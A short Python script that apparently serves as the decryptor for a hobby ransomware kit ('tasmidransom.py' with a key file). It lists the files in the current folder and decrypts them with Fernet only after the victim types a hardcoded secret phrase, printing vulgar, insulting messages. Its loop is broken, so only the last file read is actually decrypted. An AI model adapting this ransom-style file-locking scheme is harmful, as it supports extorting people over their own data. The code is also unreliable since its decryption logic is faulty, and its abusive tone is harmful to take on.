#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#let's find some files


files = []

for file in os.listdir():
	if file == "tasmidransom.py" or file == "thekey.key" or file == "tasmudecrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "fuck deeab"

user_phrase = input("Enter The Secret Phrase To Decrypt Your Files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
	contents_decrypted = Fernet(secretkey).decrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)
		print("congrats!, your files are decypted... go and fu*k your files.")
else: 
	print("sorry, wrong secret phrase! Go and give a blow*job to tasmid")
